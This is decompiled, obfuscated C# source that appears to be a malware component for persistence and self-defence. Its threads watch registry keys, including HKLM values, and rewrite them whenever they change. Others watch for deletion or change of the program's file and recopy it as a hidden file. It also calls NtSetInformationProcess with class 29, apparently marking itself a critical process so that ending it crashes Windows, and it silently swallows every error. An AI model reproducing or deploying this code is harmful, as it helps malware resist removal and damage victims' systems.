using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Threading;
using Microsoft.Win32;
using ns0;

namespace ns1;

internal class Class4
{
	private enum Enum0 : uint
	{
		const_0 = 1u,
		const_1,
		const_2
	}

	private enum Enum1 : uint
	{
		const_0 = 1u,
		const_1 = 2u,
		const_2 = 4u,
		const_3 = 8u
	}

	private static ManualResetEvent manualResetEvent_0 = new ManualResetEvent(initialState: false);

	private static bool bool_0 = false;

	public static void smethod_0()
	{
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		manualResetEvent_0.Reset();
		bool_0 = true;
		AppDomain.CurrentDomain.ProcessExit += smethod_2;
		AppDomain.CurrentDomain.DomainUnload += smethod_2;
		SystemEvents.add_SessionEnding(new SessionEndingEventHandler(smethod_2));
		Thread thread = new Thread(smethod_3);
		thread.IsBackground = true;
		thread.Start(new object[2]
		{
			_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_22(),
			Enum0.const_0
		});
		Thread thread2 = new Thread(smethod_3);
		thread2.IsBackground = true;
		thread2.Start(new object[2]
		{
			_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_23(),
			Enum0.const_1
		});
		Thread thread3 = new Thread(smethod_3);
		thread3.IsBackground = true;
		thread3.Start(new object[2]
		{
			_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_24(),
			Enum0.const_2
		});
		Thread thread4 = new Thread(smethod_4);
		thread4.IsBackground = true;
		thread4.Start(Class12.string_5[0]);
		Thread thread5 = new Thread(smethod_4);
		thread5.IsBackground = true;
		thread5.Start(Class12.string_5[1]);
		smethod_5(bool_0);
	}

	public static void smethod_1()
	{
		bool_0 = false;
		manualResetEvent_0.Set();
		smethod_5(bool_0);
	}

	private static void smethod_2(object object_0, object object_1)
	{
		smethod_5(bool_1: false);
	}

	private static void smethod_3(object object_0)
	{
		AutoResetEvent autoResetEvent = new AutoResetEvent(initialState: false);
		WaitHandle[] waitHandles = new WaitHandle[2] { autoResetEvent, manualResetEvent_0 };
		RegistryKey registryKey = Class11.registryKey_0.OpenSubKey((string)((object[])object_0)[0], RegistryKeyPermissionCheck.ReadSubTree, RegistryRights.QueryValues | RegistryRights.Notify | RegistryRights.ReadPermissions);
		while (!manualResetEvent_0.WaitOne(0, exitContext: true) && registryKey != null)
		{
			try
			{
				if (RegNotifyChangeKeyValue(((SafeHandle)registryKey.GetType().GetField(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_55(), BindingFlags.Instance | BindingFlags.NonPublic)!.GetValue(registryKey)).DangerousGetHandle(), bool_1: true, (Enum1)15u, autoResetEvent.SafeWaitHandle.DangerousGetHandle(), bool_2: true) == 0 && WaitHandle.WaitAny(waitHandles) == 0)
				{
					switch ((Enum0)((object[])object_0)[1])
					{
					case Enum0.const_0:
						smethod_6(Class11.registryKey_0, _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_22(), Class12.string_6[0], Class12.string_5[0], RegistryValueKind.String);
						break;
					case Enum0.const_1:
						smethod_6(Class11.registryKey_0, _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_23(), Class12.string_6[1], Class12.string_5[1], RegistryValueKind.String);
						break;
					case Enum0.const_2:
						smethod_6(Registry.LocalMachine, _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_24() + Class12.string_2, _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_25(), Class12.string_5[0] + _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_26(), RegistryValueKind.String);
						smethod_6(Registry.LocalMachine, _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_24() + Class12.string_2, _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_27(), 1, RegistryValueKind.DWord);
						break;
					}
				}
			}
			catch
			{
			}
		}
	}

	private static void smethod_4(object object_0)
	{
		FileInfo fileInfo = new FileInfo((string)object_0);
		FileSystemWatcher fileSystemWatcher = new FileSystemWatcher(fileInfo.DirectoryName);
		while (!manualResetEvent_0.WaitOne(0, exitContext: true))
		{
			WaitForChangedResult waitForChangedResult = fileSystemWatcher.WaitForChanged(WatcherChangeTypes.Deleted | WatcherChangeTypes.Changed | WatcherChangeTypes.Renamed);
			if ((!(waitForChangedResult.Name == fileInfo.Name) && !(waitForChangedResult.OldName == fileInfo.Name)) || !bool_0)
			{
				continue;
			}
			try
			{
				if (File.Exists((string)object_0))
				{
					File.Delete((string)object_0);
				}
				File.Copy(Class12.string_0, (string)object_0, overwrite: true);
				File.SetAttributes((string)object_0, FileAttributes.Hidden | FileAttributes.Archive);
			}
			catch
			{
			}
		}
	}

	private static void smethod_5(bool bool_1)
	{
		uint Z6g = Convert.ToUInt32(bool_1);
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29u, ref Z6g, 4u);
	}

	private static void smethod_6(RegistryKey registryKey_0, string string_0, string string_1, object object_0, RegistryValueKind registryValueKind_0)
	{
		try
		{
			if (registryKey_0.OpenSubKey(string_0) == null)
			{
				registryKey_0.CreateSubKey(string_0);
			}
			RegistryKey registryKey = registryKey_0.OpenSubKey(string_0, writable: true);
			if (registryKey.Equals(string_1))
			{
				if (registryKey.GetValue(string_1) != object_0)
				{
					registryKey.SetValue(string_1, object_0, registryValueKind_0);
				}
			}
			else
			{
				registryKey.SetValue(string_1, object_0, registryValueKind_0);
			}
			registryKey.Close();
			registryKey_0.Close();
		}
		catch
		{
		}
	}

	[DllImport("advapi32", CharSet = CharSet.Unicode)]
	private static extern int RegNotifyChangeKeyValue(IntPtr intptr_0, bool bool_1, Enum1 enum1_0, IntPtr intptr_1, bool bool_2);

	[DllImport("ntdll", CharSet = CharSet.Unicode)]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, uint bR, ref uint Z6g, uint uint_0);
}
